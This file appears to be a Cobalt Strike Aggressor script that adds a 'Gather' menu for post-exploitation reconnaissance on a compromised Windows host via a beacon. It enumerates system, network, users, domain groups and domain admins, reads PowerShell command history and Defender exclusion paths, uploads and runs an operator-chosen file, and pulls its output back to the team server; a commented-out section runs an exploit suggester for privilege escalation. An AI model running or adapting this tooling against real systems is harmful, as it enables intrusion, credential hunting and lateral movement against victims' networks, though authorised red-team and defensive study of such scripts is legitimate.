#define functions

local('$bid');

sub sysinfo{
    btask($bid, "=====Systeminfo=====", "");
    bshell($bid, "systeminfo");
}

sub ipconfig{
    btask($bid, "=====Ipconfig=====", "");
    bshell($bid, "ipconfig /all");
}

sub netstat{
    btask($bid, "=====Connection=====", "");
    bshell($bid, "netstat -ano | findstr LISTENING");
}

sub software{
    btask($bid, "=====Software=====", "");
    bshell($bid, "wmic product get name,version");
}

sub ps_soft{
    btask($bid, "=====Software (powershell)=====", "");
    bpowershell($bid, 'Get-WmiObject -class Win32_Product | Select-Object -Property name,version');
}

sub runprocs{
    btask($bid, "=====Startup process=====", "");
    bshell($bid, "wmic startup get command,caption");
}

sub pros_detail{
    btask($bid, "=====Running process=====", "");
    bshell($bid, "wmic process get caption,executablepath,commandline");
}

sub tasks{
    btask($bid, "=====Task=====", "");
    bshell($bid, "schtasks /query /fo LIST /v");
}

sub users{
    btask($bid, "=====Users=====", "");
    bshell($bid, "net user && net localgroup administrators && net session && net share");
}

sub hotfix{
    btask($bid, "=====Hotfix=====", "");
    bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
}

sub firewall{
    btask($bid, "=====Firewall=====", "");
    bshell($bid, "netsh firewall show config");
}

sub proxy{
    btask($bid, "=====Proxy=====", "");
    breg_query($bid, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "x64");
}

sub chistory{
    btask($bid, "=====Cmd & Powershell history=====", "");
    bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
}

sub recent{
    btask($bid, "=====Recent=====", "");
    bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
}

sub domain{
    btask($bid, "=====Domain=====", "");
    btask($bid, "Part One", "");
    bshell($bid, "net view /domain && net group /domain && net group \"domain computers\" /domain && net accounts /domain && net group \"Domain Controllers\" /domain ");
    btask($bid, "Part Two", "");
    bshell($bid, "Nslookup -type=SRV _ldap._tcp && nltest /domain_trusts && netdom query pdc");
    btask($bid, "Part Tree", "");
    bshell($bid, "net user /domain && wmic useraccount get /all && dsquery user && net group \"domain admins\" /domain");
}

sub defender{
    btask($bid, "=====Defender exclusions info=====");
    btask($bid, "Exclusions Paths");
    breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", "x64");
    btask($bid, "Exclusions Extensions");
    breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions", "x64");
    btask($bid, "Exclusions Processes");
    breg_query($bid, "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes", "x64");
}

sub main{
    foreach $func (keys($3)){
        if ($3[$func] eq 'true'){
            eval($func.'();');
        }
    }
    if ($3['automatic'] ne ""){
        bupload($bid, $3['automatic']);
        #$fpath = $3['automatic'];
        $fname = getFileName(replace($3['automatic'], '\\\\', "/"));
        brun($bid,$fname);
        if ($3['redirect'] ne ""){
            show_message("You have filled in the redirection option, which will automatically download the redirection file to your team server after the script runs !");
            sleep(5 * 1000);
            bdownload($bid, $3['redirect']);
        }
    }
}

# sub audit{
#     $bid = $1['@'];
#     $fname = beacon_info($bid,"computer")."-info.txt";
#     $lpath = script_resource("temp\\ $+ $fname");
#     $suggester = script_resource("local\\windows-exploit-suggester.py");
#     $db = script_resource("local\\2020-04-10-mssb.xls");
#     $audit_fname = script_resource("logs\\".beacon_info($bid,"computer")."-audit.txt");
#     bshell($bid,"systeminfo >  $+ $fname");
#     bdownload($bid, $fname);
#     #sleep(3 * 1000);
#     foreach %item (downloads()){
#             if (%item['name'] eq $fname){
#                 $rpath = %item['lpath'];
#                 sync_download($rpath, $lpath);
#             }
#         } 
#     #sleep(3 * 1000);
#     if (-exists $lpath){
#         $cmd = $suggester." -i  $+ $lpath  -d  $+ $db";
#         $process = exec("cmd.exe /c ".$cmd);
#         @data = readAll($process);
#         $out = openf(">" . $audit_fname); 
#         foreach $line (@data){
#             writeb($out, $line."\r\n");
#         }         
#         closef($out);
#         closef($process);
#         deleteFile(replace($fname, "\\\\", "/"));
#         exec("cmd.exe /c start ".script_resource("logs\\"));
#         }
#     }


#append menus

    menu "Gather"{

        item "Collector"{
            $bid = $1['@'];
            $dialog = dialog("Gather Informations",%(bid => $bid), &main);
            dialog_description($dialog, "Collect information about the target host");
            drow_checkbox($dialog, "sysinfo", "System informations", "");
            drow_checkbox($dialog, "ipconfig", "Network card configuration information", "");
            drow_checkbox($dialog, "netstat", "Listening TCP port list", "");
            drow_checkbox($dialog, "software", "Installed software list", "");
            drow_checkbox($dialog, "ps_soft", "Installed software list(use powershell)", "");
            drow_checkbox($dialog, "runprocs", "Startup processes list", "");
            drow_checkbox($dialog, "pros_detail", "Running processes list", "");
            drow_checkbox($dialog, "tasks", "Schedule task list", "");
            drow_checkbox($dialog, "users", "Local users , administrators , share and sessions list", "");
            drow_checkbox($dialog, "hotfix", "Hotfix list", "");
            drow_checkbox($dialog, "firewall", "Firewall configuration information", "");
            drow_checkbox($dialog, "proxy", "System proxy configuration information", "");
            drow_checkbox($dialog, "chistory", "Cmd & Powershell history", "");
            drow_checkbox($dialog, "recent", "Recent history", "");
            drow_checkbox($dialog, "defender", "Defender info", "");
            drow_checkbox($dialog, "domain", "Domain informations", "");
            drow_file($dialog, "automatic", "Use automatic script: ");
            drow_text($dialog, "redirect", "Script output file[optional]: ");
            dbutton_action($dialog, "Run");
            dialog_show($dialog);
        }

        # item "Audit available lpe vulnerability"{
        #     audit($1);
        # }
    }